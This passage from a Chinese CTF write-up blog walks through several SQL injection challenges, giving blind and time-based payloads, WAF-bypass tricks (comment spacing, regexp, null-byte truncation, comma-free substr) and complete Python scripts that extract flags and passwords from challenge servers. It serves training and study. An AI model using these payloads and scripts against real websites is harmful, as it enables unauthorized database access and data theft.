<h3 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h3><p><code>if(1=1,1,2)</code>测试有回显，于是写脚本爆破</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://228a1e37-3bc0-4272-ac01-c99d47dfd854.node3.buuoj.cn/?stunum="</span>
result <span class="token operator">=</span> <span class="token string">""</span>


<span class="token comment"># if(ascii(mid((select/**/database()),&#123;&#125;,1))>&#123;&#125;,1,2)    ctf</span>
<span class="token comment"># if(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))>&#123;&#125;,1,2)     flag,score</span>
<span class="token comment"># if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='flag'),&#123;&#125;,1))>&#123;&#125;,1,2)         flag,value</span>
<span class="token comment"># if(ascii(mid((select/**/value/**/from/**/flag),&#123;&#125;,1))>&#123;&#125;,1,2)</span>

payload <span class="token operator">=</span> <span class="token string">"if(ascii(mid((select/**/value/**/from/**/flag),&#123;&#125;,1))>&#123;&#125;,1,2)"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    high <span class="token operator">=</span> <span class="token number">127</span>
    low <span class="token operator">=</span> <span class="token number">32</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    <span class="token keyword">while</span> high <span class="token operator">></span> low<span class="token punctuation">:</span>
        payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>
        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payloads<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            high <span class="token operator">=</span> mid
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre>

<p>注出flag</p>
<h3 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h3><p>拿到题目，可以看到会将sql查询的结果打印出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20210712224933801.png" alt loading="lazy"></p>
<p>fuzz测试，以下可用</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20210712225240015.png" alt loading="lazy"></p>
<p>注入方式</p>
<ul>
<li>单引号用<code>\</code>转义，</li>
<li>结束的单引号用<code>;%00</code>截断，在返回的<code>header</code>头中可以看到<code>php</code>版本为<code>PHP/5.2.16</code>，所以可以用00截断</li>
<li><code>regexp</code>绕过特殊字符，来对passwd的值来进行盲注</li>
</ul>
<p>payload：<code>username=aaa\&amp;passwd=||case/**/when/**/passwd/**/regexp/**/&quot;^you_will_never_know7788990&quot;/**/then/**/1/**/else/**/0/**/end;%00</code></p>
<p>精简写法<code>username=aaa\&amp;passwd=||passwd/**/regexp/**/&quot;^you_will_never_know7788990&quot;;%00</code></p>
<p>如果<code>passwd</code>正则校验正确，则会重定向到<code>welcome.php</code></p>
<p>Exp：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

url <span class="token operator">=</span> <span class="token string">"http://11185b34-a644-43f8-b6ef-676ab81b534f.node4.buuoj.cn/index.php"</span>
strs <span class="token operator">=</span> <span class="token string">"_"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_uppercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits
pwd <span class="token operator">=</span> <span class="token string">""</span>
<span class="token comment"># proxies = &#123; "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080", &#125; </span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> strs<span class="token punctuation">:</span>
        d <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">'aaa\\'</span><span class="token punctuation">,</span>
            <span class="token string">"passwd"</span><span class="token punctuation">:</span> <span class="token string">'||case/**/when/**/passwd/**/regexp/**/"^&#123;&#125;"/**/then/**/1/**/else/**/0/**/end;\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>pwd<span class="token operator">+</span>j<span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>d<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">503</span> <span class="token keyword">or</span> r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">429</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>d<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span><span class="token operator">+</span><span class="token string">"status_code:"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" pwd:"</span><span class="token operator">+</span>pwd<span class="token operator">+</span>j<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"welcome.php"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            pwd <span class="token operator">=</span> pwd <span class="token operator">+</span> j
            <span class="token keyword">break</span></code></pre>

<p>最后拿到的密码<code>you_will_never_know7788990</code>，随便用一个账号登录即可拿到flag</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="WEB-Login-Only-For-36D"><a href="#WEB-Login-Only-For-36D" class="headerlink" title="WEB_Login_Only_For_36D"></a>WEB_Login_Only_For_36D</h3><p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210354938.png" alt loading="lazy"></p>
<p><strong>F12</strong>可以看到<strong>hint</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210443551.png" alt loading="lazy"></p>
<p>可以看到这里需要username匹配admin，随后才可以输入密码，先在<strong>password</strong>处<strong>fuzz</strong>一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL%E6%B3%A8%E5%85%A5/image-20200501210743129.png" alt loading="lazy"></p>
<p>过滤了单引号，如果password中要用单引号闭合的话显然很难这里就需要从username入手，详情可以参考上面的<code>BJDCTF-2nd—简单注入</code>，和p神和Smi1e师傅的文章：</p>
<ul>
<li><a href="https://www.smi1e.top/%E5%B0%8F%E5%AF%86%E5%9C%88%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%87%A0%E7%A7%8D%E5%8F%98%E5%BD%A2%E5%AD%A6%E4%B9%A0/">[小密圈]经典写配置漏洞与几种变形学习</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html">经典写配置漏洞与几种变形</a></li>
</ul>
<p>这里直接给出payload：<code>username=admin%0a\&amp;password=/**/or/**/if(left((password),1)REGEXP/**/binary/**/&quot;I&quot;,sleep(3),1)#</code></p>
<p>exp如下：</p>
<pre class="language-php" data-language="php"><code class="language-php">import requests
url <span class="token operator">=</span> <span class="token string double-quoted-string">"https://bbafd3a8-7f89-4adf-84c2-7028b93775cc.chall.ctf.show/"</span>
header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string double-quoted-string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">"Accept"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string double-quoted-string">"application/x-www-form-urlencoded"</span>
<span class="token punctuation">&#125;</span>
str1 <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>
passwd <span class="token operator">=</span> <span class="token string single-quoted-string">''</span>
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j in str1<span class="token punctuation">:</span>
        exp <span class="token operator">=</span> passwd <span class="token operator">+</span> j
        payload <span class="token operator">=</span> <span class="token string single-quoted-string">'/**/or/**/if(left((password),&#123;&#125;)REGEXP/**/binary/**/"^&#123;&#125;",sleep(3),1)#'</span><span class="token operator">.</span><span class="token function">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> exp<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string single-quoted-string">'username'</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">'admin%0a\\'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'password'</span><span class="token punctuation">:</span> payload
        <span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token operator">.</span>elapsed<span class="token operator">.</span><span class="token function">total_seconds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>
            passwd <span class="token operator">=</span> passwd <span class="token operator">+</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<p>这里需要注意以下几点：</p>
<ul>
<li><code>binary</code>匹配大小写</li>
<li><code>mid</code>和<code>substr</code>被过滤了用<code>left</code></li>
<li>空格用<code>/**/</code></li>
</ul>
<p>随后就可以跑出密码登录即可得到<code>flag</code></p>
<h3 id="XCTF—INSERT-INTO注入"><a href="#XCTF—INSERT-INTO注入" class="headerlink" title="XCTF—INSERT INTO注入"></a>XCTF—INSERT INTO注入</h3><p><strong>解题核心</strong>—————–substr(),x-forwarded-for头注入</p>
<p>平台：[bugku INSERT INTO注入](<a href="https://ctf.bugku.com/challenges#INSERT">https://ctf.bugku.com/challenges#INSERT</a> INTO注入)题目链接：<a href="http://123.206.87.240:8002/web15/">http://123.206.87.240:8002/web15/</a></p>
<p>在题目的下方给了源码：</p>
<pre class="language-php" data-language="php"><code class="language-php">flag格式：flag<span class="token punctuation">&#123;</span>xxxxxxxxxxxx<span class="token punctuation">&#125;</span>
不如写个Python吧

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$ip_arr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token variable">$ip_arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token variable">$host</span><span class="token operator">=</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
<span class="token variable">$user</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$pass</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token variable">$connect</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to select database"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">getIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'your ip is :'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into client_ip (ip) values ('<span class="token interpolation"><span class="token variable">$ip</span></span>')"</span><span class="token punctuation">;</span>
<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>通过观察代码可以发现变量<code>$ip</code>可以通过更改<code>X-Forwarded-For</code>头进行更改，且后面的代码把每一次查询的ip都插入的数据库，推测<code>$ip</code>处存在注入点，于是burp抓包判断注入点：</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/OZAFpjoRIb1Wyig.png" style="zoom: 50%;" loading="lazy">

<p>利用延时注入验证此处确实存在注入点，于是开始构造注入函数，代码<code>$ip_arr = explode(&#39;,&#39;, $ip);</code>通过逗号将ip分离开，只取第一个，所以这里相当于过过滤了逗号注入符号，于是我们通常用的<code>mid</code>、<code>substr</code>，<code>if</code>判断在这里用不了了，在这里用以下注入方法替换：</p>
<p><code>if(sql,num,str)</code>可替换成<code>case when sql then sleep(5) else 1 end</code></p>
<p><code>sql</code>注入语句中的<code>substr</code>语句可以写成：<code>substr(sql from num for 1) = str</code>，将语句中的逗号替换成了<code>from</code>和<code>for</code>，语句照常进行，<code>mid</code>函数也可以这样</p>
<p>Payload1：<code>127.0.0.1&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>client_ip</code>,<code>flag</code></p>
<p>Payload2：<code>127.0.0.1&#39;and (case when (substr((select group_concat(column_name) from information_schema.columns where table_schema=&#39;flag&#39;) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到表<code>flag</code>中的<code>flag</code>列</p>
<p>Payload3：<code>127.0.0.1&#39;and (case when (substr((select group_concat(flag) from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end )) #</code>，得到<code>flag</code>列中的<code>flag</code></p>
<p>python脚本如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.-"</span>
url <span class="token operator">=</span> <span class="token string">"http://123.206.87.240:8002/web15/"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token string">"此处为Payload"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        header <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"x-forwarded-for"</span><span class="token punctuation">:</span>data<span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<h3 id="2020ichunqiu新春公益赛—盲注"><a href="#2020ichunqiu新春公益赛—盲注" class="headerlink" title="2020ichunqiu新春公益赛—盲注"></a>2020ichunqiu新春公益赛—盲注</h3><p>首先点进去的界面：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment"># flag在fl4g里</span>
    <span class="token keyword">include</span> <span class="token string single-quoted-string">'waf.php'</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysql</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">check_sql</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from flllllllag where id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>
            <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>可以看到需要我们get一个id参数来绕过waf里的check_sql函数完成注入，并且<code>flag</code>在<code>fl4g</code>里</p>
<p>首先题目过滤了select，fuzz后发现以下字符和函数被过滤</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SQL注入/gKbs6mkaDcpUx5W.png" style="zoom: 80%;" loading="lazy">

<p>发现<code>sleep</code>函数并没有被过滤，于是想到延时注入，<code>=</code>、<code>like</code>、<code>rlike</code>被过滤用<code>regexp</code>函数代替</p>
<p>regexp后所跟的东西作为正则表达式处理。</p>
<p>Payload：<code>id=1 and if(ascii(mid(fl4g,1,1))regexp 102,sleep(3),1)</code></p>
<p>于是写出盲注注入脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://c6a55177986a42829935671bc7988fbd1a2652564f754cac.changame.ichunqiu.com/?id="</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> j<span class="token operator">&lt;</span><span class="token number">58</span> <span class="token keyword">or</span> j<span class="token operator">></span><span class="token number">96</span><span class="token punctuation">:</span>
        <span class="token comment">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>
            d <span class="token operator">=</span> <span class="token string">"1 and if(ascii(mid(fl4g,"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",1))regexp "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",sleep(3),1)"</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>d<span class="token punctuation">)</span>
            <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span></code></pre>

<h3 id="网鼎杯2018—Unfinish"><a href="#网鼎杯2018—Unfinish" class="headerlink" title="网鼎杯2018—Unfinish"></a>网鼎杯2018—Unfinish</h3><p>登录用的邮箱和密码，注册可以注册邮箱账号和密码，并且在登录后的index.php处有显示注册的用户名，用户名存入了数据库，于是推测在register.php处存在注入点，测试后发现过滤了逗号和information，不过可以用from和for代替，payload：<code>0&#39; or (case when (substr((select * from flag) from &#123;&#125; for 1 )=&#39;&#123;&#125;&#39;) then sleep(3) else 1 end) or &#39;1</code>，注意这里判断响应时间的时候要用time库，平常用的<code>elapsed.total_seconds()</code>在这里好像不管用，测试后发现这个函数获得的是最后一次请求的响应时间，而题目中的register.php注册成功会重定向到login.php，于是会导致结果输出不出来，于是改用time库</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,&#123;&#125;_!@#$%^&amp;*.-"</span>
url <span class="token operator">=</span> <span class="token string">"http://221e6a91-2118-48a2-832a-a910da7b4e1b.node3.buuoj.cn/register.php"</span>
header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"</span><span class="token punctuation">,</span>
    <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span><span class="token punctuation">,</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"0' or (case when (substr((select * from flag) from &#123;&#125; for 1 )='&#123;&#125;') then sleep(3) else 1 end) or '1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        <span class="token comment">#print(payload)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"111@111"</span><span class="token punctuation">,</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"aaa"</span>
        <span class="token punctuation">&#125;</span>
        startTime<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
        <span class="token comment">#print(r.status_code)</span>
        <span class="token comment">#print(r.text)</span>
        <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>startTime<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h3><p><code>X-Forwarded-For</code>头注入，</p>
